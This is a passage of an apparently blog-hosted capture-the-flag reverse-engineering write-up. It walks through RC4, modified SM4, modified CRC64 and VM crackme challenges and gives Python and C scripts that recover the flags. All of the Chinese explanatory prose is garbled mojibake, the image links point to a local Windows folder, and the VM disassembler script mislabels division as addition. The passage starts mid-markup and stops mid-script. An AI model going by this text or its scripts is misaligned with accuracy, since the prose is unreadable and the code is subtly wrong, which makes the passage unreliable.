class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="rc4é€†å‘"><a href="#rc4é€†å‘" class="headerlink" title="rc4é€†å‘"></a>rc4é€†å‘</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">t = <span class="string">b&quot;5m5d5w5d5b5n5m5d5w5d5b5n5m5d5w5d5b5n\x8e&quot;</span></span><br><span class="line"><span class="comment"># tmp[i] = flag[i] + t[i]-112</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher.ARC4 <span class="keyword">import</span> *</span><br><span class="line">enc = <span class="built_in">bytes</span>([<span class="number">0x38</span>, <span class="number">0x9A</span>, <span class="number">0xFA</span>, <span class="number">0xC3</span>, <span class="number">0x5B</span>, <span class="number">0x89</span>, <span class="number">0xA5</span>, <span class="number">0xE6</span>, <span class="number">0xD0</span>, <span class="number">0xAB</span>, <span class="number">0x42</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x09</span>, <span class="number">0x42</span>, <span class="number">0xAB</span>, <span class="number">0x33</span>, <span class="number">0x2F</span>, <span class="number">0x98</span>, <span class="number">0x42</span>, <span class="number">0x2E</span>, <span class="number">0x59</span>, <span class="number">0x6D</span>, <span class="number">0x41</span>])</span><br><span class="line">rc4 = new(t)</span><br><span class="line">p = rc4.decrypt(enc)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line">p = <span class="built_in">list</span>(p)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p)):</span><br><span class="line">    p[i] = (p[i]+<span class="number">112</span>-t[i])&amp;<span class="number">0xff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(p))</span><br></pre></td></tr></table></figure><h4 id="ä¸ç»è¿‡rc4"><a href="#ä¸ç»è¿‡rc4" class="headerlink" title="ä¸ç»è¿‡rc4"></a>ä¸ç»è¿‡rc4</h4><p>å¯¹boxè¿›è¡Œäº¤å‰å¼•ç”¨å¯ä»¥å‘ç°ï¼Œboxå’Œbox2å…¶å®æ˜¯ç›¸åŒçš„</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240208000241839.png" alt="image-20240208000241839"></p><p>é‚£ä¹ˆrc4åŠ å¯†åœ¨ä½¿ç”¨ç›¸åŒboxçš„å‰æä¸‹ï¼Œæƒ³è¦å¾—åˆ°çš„å¯†æ–‡ç›¸åŒï¼Œå°±å¿…é¡»ä¿è¯æ˜æ–‡åœ¨è¿›è¡Œrc4åŠ å¯†ä¹‹å‰å°±æ˜¯ç›¸åŒçš„ï¼Œå³keyå’ŒtemStråœ¨åŠ å¯†å‰å°±æ˜¯ç›¸åŒçš„ã€‚</p><p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç®€åŒ–æˆå¦‚ä¸‹æ­¥éª¤ï¼š</p><p>key &#x3D; ç”¨æˆ·è¾“å…¥ + str2_0 - 112</p><p>temStr &#x3D; +i&amp;[@Y:g8[&amp;l$f8S8v$Y&amp;e&gt;{</p><p>str2_0 &#x3D; unk_6C8E68 - 114</p><p>unk_6C8E68å°±æ˜¯ä¿„æ–‡å•è¯Ğ½ĞµÑ‡ĞµĞ³Ğ¾é‡å¤3æ¬¡</p><blockquote><p>å‡ ä¸ªé—®ç­”å…¨éƒ½æ²¡ç”¨ï¼Œçœ‹ä¸­é—´å…³é”®çš„å‡ ä¸ªåŠ å¯†å‡½æ•°</p><p>ä¸­é—´æ¶‰åŠåˆ°rc4ï¼Œä½†æ˜¯æœ€åç”¨äºæ¯”å¯¹çš„key2å’Œstr1ç»è¿‡åŒä¸€ä¸ªSç›’çš„RC4åŠ å¯†ï¼Œç­‰äºæ²¡åŠ å¯†</p><p>å‡ ä¸ªé•¿å¾—åƒkeyçš„å‡ ä¸ªå­—ç¬¦ä¸²æ˜¯æœ‰ç”¨çš„ï¼Œæ’é™¤å¹²æ‰°ä¹‹åé€»è¾‘éå¸¸ç®€å•</p><p><a href="http://t.csdnimg.cn/QKP71">http://t.csdnimg.cn/QKP71</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">char</span> rus[<span class="number">38</span>] = <span class="string">&quot;Ğ½ĞµÑ‡ĞµĞ³Ğ¾Ğ½ĞµÑ‡ĞµĞ³Ğ¾Ğ½ĞµÑ‡ĞµĞ³Ğ¾&quot;</span>;<span class="comment">//37</span></span><br><span class="line">    <span class="type">char</span> key2[<span class="number">26</span>] = <span class="string">&quot;+i&amp;[@Y:g8[&amp;l$f8S8v$Y&amp;e&gt;&#123;&quot;</span>;<span class="comment">//25</span></span><br><span class="line">    <span class="type">char</span> key1[<span class="number">38</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//37</span></span><br><span class="line">    <span class="type">char</span> flag[<span class="number">26</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="built_in">strlen</span>(rus); ++i)</span><br><span class="line">        key1[i] = rus[i] - <span class="number">114</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s   %d&quot;</span>, key1, <span class="built_in">strlen</span>(key1));<span class="comment">//5m5d5w5d5b5n5m5d5w5d5b5n5m5d5w5d5b5n 37</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="built_in">strlen</span>(key2); ++i)</span><br><span class="line">        flag[i] = key2[i] - key1[i] + <span class="number">112</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, flag);<span class="comment">//flag&#123;Russian_is_so_easy&#125;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><h3 id="Ezpython"><a href="#Ezpython" class="headerlink" title="Ezpython"></a>Ezpython</h3><h4 id="è€ƒç‚¹ï¼šsm4ï¼Œpython"><a href="#è€ƒç‚¹ï¼šsm4ï¼Œpython" class="headerlink" title="è€ƒç‚¹ï¼šsm4ï¼Œpython"></a>è€ƒç‚¹ï¼šsm4ï¼Œpython</h4><p>pyinstalleræ‰“åŒ…pythonç”Ÿæˆçš„exe</p><p>pyinstxtractorå·¥å…·æ‹†åŒ…â€”ezpython.exe_extracted</p><p>é‡Œé¢æ‰¾åˆ°ezpython.pycæ–‡ä»¶ï¼Œä½¿ç”¨uncompyle6 åç¼–è¯‘å‡ºæºç </p><p>uncompyle6.exe .\ezpython.pyc</p><p>SM4åŠ å¯†</p><p>å¯»æ‰¾å¯†æ–‡å’Œkeyè¿›è¡Œè§£å¯†</p><p>ç”±äºç¼–ç é—®é¢˜ï¼Œä½¿ç”¨uncompyle6.exe .\ezpython.pyc &gt; ezpython.pyä¼šå‡ºç°æŠ¥é”™</p><p>äºæ˜¯å°†ä¸Šè¿°åç¼–è¯‘å‡ºçš„æºç è´´è¿›ä¸€ä¸ªè‡ªå·±æ–°å»ºçš„ezpython.pyæ–‡ä»¶ä¸­ï¼ŒæŠŠè¿™ä¸ªæ–‡ä»¶æ”¾è¿›ezpython.exe_extractedæ–‡ä»¶é‡Œï¼Œç”¨vscodeæ‰“å¼€è¿™ä¸ªæ–‡ä»¶å¤¹</p><p>ä¸ºäº†å¾—åˆ°keyå’Œenc</p><p>éœ€è¦åœ¨æ–‡ä»¶å¤¹é‡Œé¢æ‰¾åˆ°secret.pycï¼Œç„¶åå¯¹å…¶è¿›è¡Œåç¼–è¯‘</p><p>uncompyle6.exe .\secret.pyc &gt; .\secret.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key = &#x27;BeginCTFBeginCTF&#x27;</span><br><span class="line">enc = </span><br><span class="line">b&#x27;JmjJEAJGMT6F9bmC+Vyxy8Z1lpfaJzdEX6BGG/qgqUjUpQaYSON1CnZyX9YXTEClSRYm7PFZtGxmJw6LPuw1ww==&#x27;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯èµ›åšå¨å­æ±‚ä¸å‡ºï¼ŒçŒœæµ‹é­”æ”¹sm4ç®—æ³•</p><p>ezpython.pyä¸­å¯¼å…¥äº†sm4åº“ï¼Œäºæ˜¯å°†æ–‡ä»¶å¤¹å†…çš„sm4.pycè¿›è¡Œåç¼–è¯‘</p><p>uncompyle6.exe .\sm4.pyc &gt; sm4.py</p><p>æ ¹æ®é¢˜ç›®æç¤ºï¼Œé­”æ”¹å¯èƒ½ä¸å¯†é’¥ç›¸å…³ï¼Œäºæ˜¯ç›´æ¥æŸ¥æ‰¾key</p><p>å®¹æ˜“å‘ç°CryptSM4ç±»ä¸‹çš„set_keyæ–¹æ³•å­˜åœ¨é­”æ”¹</p><p>å°†åŸå§‹keyå€¼å¼‚æˆ–äº†37</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240208001132113.png" alt="image-20240208001132113"></p><h3 id="å‡ºé¢˜äººçš„å¯†ç æ˜¯ä»€ä¹ˆ"><a href="#å‡ºé¢˜äººçš„å¯†ç æ˜¯ä»€ä¹ˆ" class="headerlink" title="å‡ºé¢˜äººçš„å¯†ç æ˜¯ä»€ä¹ˆ"></a>å‡ºé¢˜äººçš„å¯†ç æ˜¯ä»€ä¹ˆ</h3><p>#èŠ±æŒ‡ä»¤</p><p>æ¢å¤mainå‡½æ•°é€»è¾‘</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240208001311389.png" alt="image-20240208001311389"></p><p>ä¸»è¦åŠ å¯†æ˜¯ä¸€ä¸ªé­”æ”¹crc64</p><p>é€šè¿‡å’Œé›¶æ¯”è¾ƒï¼Œä»è€Œè¿›è¡Œä¸åŒçš„åŠ å¯†ï¼Œå®é™…ä¸Šæ˜¯æ¯”è¾ƒçš„æœ€é«˜ä½</p><p>çœ‹å¯†æ–‡æœ€ä½ä½ï¼Œæ ¹æ®æœ€ä½ä½ï¼Œåˆ¤æ–­è¿™ä¸ªæ•°åœ¨åŠ å¯†å‰æœ€é«˜ä½æ˜¯1è¿˜æ˜¯0</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="number">0x33077d</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">value, key</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        <span class="keyword">if</span> value &amp; <span class="number">1</span>:</span><br><span class="line">            value = (value ^ key) &gt;&gt; <span class="number">1</span></span><br><span class="line">            value |= <span class="number">0x8000000000000000</span>  <span class="comment">#è¿˜åŸæœ€é«˜ä½</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = value &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">out = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;B4BBD8EBD06EABCA658E4BE94DD44AF37D29C2F99589A4859DCDDF77FD45CB5D7DFD934BBCF67CF32442F5D2DDE356AE&#x27;</span>)</span><br><span class="line">out = [((i ^ <span class="number">0x25</span>) - <span class="number">5</span>) &amp; <span class="number">0xff</span> <span class="keyword">for</span> i <span class="keyword">in</span> out]</span><br><span class="line"><span class="built_in">print</span>(out)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(out), <span class="number">8</span>):</span><br><span class="line">    v = <span class="built_in">int</span>.from_bytes(out[i: i + <span class="number">8</span>], <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    flag += decrypt(v, key).to_bytes(<span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure><p>åŒæ—¶è¿™ä¸ªé¢˜ç›®é‡Œé¢è¿˜æœ‰ç®€å•çš„æ—¶é—´åè°ƒè¯•</p><h3 id="Arcï¼ˆæ²¡å­¦è¿‡çš„ï¼ˆä¼šå­¦çš„"><a href="#Arcï¼ˆæ²¡å­¦è¿‡çš„ï¼ˆä¼šå­¦çš„" class="headerlink" title="Arcï¼ˆæ²¡å­¦è¿‡çš„ï¼ˆä¼šå­¦çš„"></a><strong>Arc</strong>ï¼ˆæ²¡å­¦è¿‡çš„ï¼ˆä¼šå­¦çš„</h3><h4 id="z3-è€ƒç‚¹ï¼šå•å­—èŠ‚çˆ†ç ´ï¼Œæ··æ·†"><a href="#z3-è€ƒç‚¹ï¼šå•å­—èŠ‚çˆ†ç ´ï¼Œæ··æ·†" class="headerlink" title="z3?è€ƒç‚¹ï¼šå•å­—èŠ‚çˆ†ç ´ï¼Œæ··æ·†"></a>z3?<strong>è€ƒç‚¹ï¼šå•å­—èŠ‚çˆ†ç ´ï¼Œæ··æ·†</strong></h4><h3 id="Not-main"><a href="#Not-main" class="headerlink" title="Not main"></a>Not main</h3><h4 id="è€ƒç‚¹ï¼šTEAï¼ŒXXTEAï¼ŒVEHå¼‚å¸¸å¤„ç†ï¼Œåè°ƒè¯•"><a href="#è€ƒç‚¹ï¼šTEAï¼ŒXXTEAï¼ŒVEHå¼‚å¸¸å¤„ç†ï¼Œåè°ƒè¯•" class="headerlink" title="è€ƒç‚¹ï¼šTEAï¼ŒXXTEAï¼ŒVEHå¼‚å¸¸å¤„ç†ï¼Œåè°ƒè¯•"></a>è€ƒç‚¹ï¼šTEAï¼ŒXXTEAï¼ŒVEHå¼‚å¸¸å¤„ç†ï¼Œåè°ƒè¯•</h4><h4 id="vehåè°ƒè¯•ï¼Œå…¨å±€å˜é‡åˆå§‹åŒ–initï¼ˆæ²¡å­¦ï¼Œç»§ç»­"><a href="#vehåè°ƒè¯•ï¼Œå…¨å±€å˜é‡åˆå§‹åŒ–initï¼ˆæ²¡å­¦ï¼Œç»§ç»­" class="headerlink" title="vehåè°ƒè¯•ï¼Œå…¨å±€å˜é‡åˆå§‹åŒ–initï¼ˆæ²¡å­¦ï¼Œç»§ç»­"></a>vehåè°ƒè¯•ï¼Œå…¨å±€å˜é‡åˆå§‹åŒ–initï¼ˆæ²¡å­¦ï¼Œç»§ç»­</h4><h3 id="EZVMï¼ˆä¸å¤ªä¼š"><a href="#EZVMï¼ˆä¸å¤ªä¼š" class="headerlink" title="EZVMï¼ˆä¸å¤ªä¼š"></a>EZVMï¼ˆä¸å¤ªä¼š</h3><p>vmé¢˜ c++</p><h3 id="Goforfunï¼ˆä¸ä¼š"><a href="#Goforfunï¼ˆä¸ä¼š" class="headerlink" title="Goforfunï¼ˆä¸ä¼š"></a>Goforfunï¼ˆä¸ä¼š</h3><h4 id="è€ƒç‚¹ï¼šgoè¯­è¨€ï¼Œrc4é­”æ”¹ï¼Œå•å­—èŠ‚çˆ†ç ´"><a href="#è€ƒç‚¹ï¼šgoè¯­è¨€ï¼Œrc4é­”æ”¹ï¼Œå•å­—èŠ‚çˆ†ç ´" class="headerlink" title="è€ƒç‚¹ï¼šgoè¯­è¨€ï¼Œrc4é­”æ”¹ï¼Œå•å­—èŠ‚çˆ†ç ´"></a>è€ƒç‚¹ï¼šgoè¯­è¨€ï¼Œrc4é­”æ”¹ï¼Œå•å­—èŠ‚çˆ†ç ´</h4><p>goè¯­è¨€ç¼–å†™çš„ç¨‹åºï¼Œgo 1.21</p><p>å¯ä»¥è£…ä¸€ä¸ªidagolanghelperæ’ä»¶å¸®åŠ©æ¢å¤ç¬¦å·è¡¨</p><p>æ¢å¤ä¹‹åç¡®å®šä¸»å‡½æ•°å°±éœ€è¦åŠ¨è°ƒ</p><h3 id="Babyvmï¼ˆä¸å¤ªä¼šï¼Œç•™ç€"><a href="#Babyvmï¼ˆä¸å¤ªä¼šï¼Œç•™ç€" class="headerlink" title="Babyvmï¼ˆä¸å¤ªä¼šï¼Œç•™ç€"></a>Babyvmï¼ˆä¸å¤ªä¼šï¼Œç•™ç€</h3><h4 id="è€ƒç‚¹ï¼švmï¼ŒäºŒè¿›åˆ¶æ–‡ä»¶è¯»å†™ï¼Œz3"><a href="#è€ƒç‚¹ï¼švmï¼ŒäºŒè¿›åˆ¶æ–‡ä»¶è¯»å†™ï¼Œz3" class="headerlink" title="è€ƒç‚¹ï¼švmï¼ŒäºŒè¿›åˆ¶æ–‡ä»¶è¯»å†™ï¼Œz3"></a>è€ƒç‚¹ï¼švmï¼ŒäºŒè¿›åˆ¶æ–‡ä»¶è¯»å†™ï¼Œz3</h4><p>ä¸»ç¨‹åºé€»è¾‘ä¸éš¾ï¼Œéš¾ç‚¹åœ¨å¦‚ä½•æ‰¹é‡å¤„ç†æŒ‡ä»¤å’Œæ•°æ®ï¼Œé™„ä¸Šæ‰“å°æ±‡ç¼–è¯­è¨€çš„è„šæœ¬</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\opcode.vm&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">  bincode= <span class="built_in">list</span>(file.read())</span><br><span class="line">opcode= <span class="built_in">open</span> (<span class="string">&quot;D:\\opcode.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">byte_to_int</span>(<span class="params">a,b,c,d</span>):</span><br><span class="line">    <span class="keyword">return</span> a|(b&lt;&lt;<span class="number">8</span>)|(c&lt;&lt;<span class="number">16</span>)|(d&lt;&lt;<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">op_list=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i &lt;= <span class="number">3643</span>:</span><br><span class="line">    k=byte_to_int(bincode[<span class="number">4</span>*i],bincode[<span class="number">4</span>*i+<span class="number">1</span>],bincode[<span class="number">4</span>*i+<span class="number">2</span>],bincode[<span class="number">4</span>*i+<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">match</span> k:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            add_list=[]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,i+<span class="number">4</span>,<span class="number">1</span>):</span><br><span class="line">                add_list.append(byte_to_int(bincode[<span class="number">4</span>*j],bincode[<span class="number">4</span>*j+<span class="number">1</span>],bincode[<span class="number">4</span>*j+<span class="number">2</span>],bincode[<span class="number">4</span>*j+<span class="number">3</span>]))</span><br><span class="line">            op_list.append(<span class="built_in">str</span>(add_list[<span class="number">0</span>])+<span class="string">&#x27;=&#x27;</span>+<span class="built_in">str</span>(add_list[<span class="number">1</span>])+<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(add_list[<span class="number">2</span>]))</span><br><span class="line">            i+=<span class="number">4</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            sub_list=[]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,i+<span class="number">4</span>,<span class="number">1</span>):</span><br><span class="line">                sub_list.append(byte_to_int(bincode[<span class="number">4</span>*j],bincode[<span class="number">4</span>*j+<span class="number">1</span>],bincode[<span class="number">4</span>*j+<span class="number">2</span>],bincode[<span class="number">4</span>*j+<span class="number">3</span>]))</span><br><span class="line">            op_list.append(<span class="built_in">str</span>(sub_list[<span class="number">0</span>])+<span class="string">&#x27;=&#x27;</span>+<span class="built_in">str</span>(sub_list[<span class="number">1</span>])+<span class="string">&#x27;-&#x27;</span>+<span class="built_in">str</span>(sub_list[<span class="number">2</span>]))</span><br><span class="line">            i+=<span class="number">4</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            mul_list=[]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,i+<span class="number">4</span>,<span class="number">1</span>):</span><br><span class="line">                mul_list.append(byte_to_int(bincode[<span class="number">4</span>*j],bincode[<span class="number">4</span>*j+<span class="number">1</span>],bincode[<span class="number">4</span>*j+<span class="number">2</span>],bincode[<span class="number">4</span>*j+<span class="number">3</span>]))</span><br><span class="line">            op_list.append(<span class="built_in">str</span>(mul_list[<span class="number">0</span>])+<span class="string">&#x27;=&#x27;</span>+<span class="built_in">str</span>(mul_list[<span class="number">1</span>])+<span class="string">&#x27;*&#x27;</span>+<span class="built_in">str</span>(mul_list[<span class="number">2</span>]))</span><br><span class="line">            i+=<span class="number">4</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            div_list=[]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,i+<span class="number">4</span>,<span class="number">1</span>):</span><br><span class="line">                div_list.append(byte_to_int(bincode[<span class="number">4</span>*j],bincode[<span class="number">4</span>*j+<span class="number">1</span>],bincode[<span class="number">4</span>*j+<span class="number">2</span>],bincode[<span class="number">4</span>*j+<span class="number">3</span>]))</span><br><span class="line">            op_list.append(<span class="built_in">str</span>(div_list[<span class="number">0</span>])+<span class="string">&#x27;=&#x27;</span>+<span class="built_in">str</span>(div_list[<span class="number">1</span>])+<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(div_list[<span class="number">2</span>]))</span><br><span class="line">            i+=<span class="number">4</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            op_list.append(<span class="string">&quot;in_pointer=0&quot;</span>)</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            op_list.append(<span class="string">&quot;out_pointer=0&quot;</span>)</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            popin_list=[]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,i+<span class="number">3</span>,<span class="number">1</span>):</span><br><span class="line">                popin_list.append(byte_to_int(bincode[<span class="number">4</span>*j],bincode[<span class="number">4</span>*j+<span class="number">1</span>],bincode[<span class="number">4</span>*j+<span class="number">2</span>],bincode[<span class="number">4</span>*j+<span class="number">3</span>]))</span><br><span class="line">            op_list.append(<span class="string">&quot;popin &quot;</span>+<span class="built_in">str</span>(popin_list[<span class="number">0</span>])+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(popin_list[<span class="number">1</span>]))</span><br><span class="line">            i+=<span class="number">3</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            popout_list=[]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,i+<span class="number">3</span>,<span class="number">1</span>):</span><br><span class="line">                popout_list.append(byte_to_int(bincode[<span class="number">4</span>*j],bincode[<span class="number">4</span>*j+<span class="number">1</span>],bincode[<span class="number">4</span>*j+<span class="number">2</span>],bincode[<span class="number">4</span>*j+<span class="number">3</span>]))</span><br><span class="line">            op_list.append(<span class="string">&quot;popout &quot;</span>+<span class="built_in">str</span>(popout_list[<span class="number">0</span>])+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(popout_list[<span class="number">1</span>]))</span><br><span class="line">            i+=<span class="number">3</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">            read_list=[]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,i+<span class="number">2</span>,<span class="number">1</span>):</span><br><span class="line">                read_list.append(byte_to_int(bincode[<span class="number">4</span>*j],bincode[<span class="number">4</span>*j+<span class="number">1</span>],bincode[<span class="number">4</span>*j+<span class="number">2</span>],bincode[<span class="number">4</span>*j+<span class="number">3</span>]))</span><br><span class="line">            <span class="keyword">if</span>(read_list[<span class="number">0</span>]&lt;=<span class="number">199</span>):</span><br><span class="line">                op_list.append(<span class="string">&quot;read &quot;</span>+<span class="built_in">str</span>(read_list[<span class="number">0</span>]))</span><br><span class="line">            i+=<span class="number">2</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">            wri_list=[]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,i+<span class="number">2</span>,<span class="number">1</span>):</span><br><span class="line">                wri_list.append(byte_to_int(bincode[<span class="number">4</span>*j],bincode[<span class="number">4</span>*j+<span class="number">1</span>],bincode[<span class="number">4</span>*j+<span class="number">2</span>],bincode[<span class="number">4</span>*j+<span class="number">3</span>]))</span><br><span class="line">            op_list.append(<span class="string">&quot;write &quot;</span>+<span class="built_in">str</span>(wri_list[<span class="number">0</span>]))</span><br><span class="line">            i+=<span class="number">2</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">            jmp_list=[]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,i+<span class="number">3</span>,<span class="number">1</span>):</span><br><span class="line">                jmp_list.append(byte_to_int(bincode[<span class="number">4</span>*j],bincode[<span class="number">4</span>*j+<span class="number">1</span>],bincode[<span class="number">4</span>*j+<span class="number">2</span>],bincode[<span class="number">4</span>*j+<span class="number">3</span>]))</span><br><span class="line">            op_list.append(<span class="string">&quot;jmp &quot;</span>+<span class="built_in">str</span>(jmp_list[<span class="number">0</span>])+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(jmp_list[<span class="number">1</span>]))</span><br><span class="line">            i+=<span class="number">3</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">          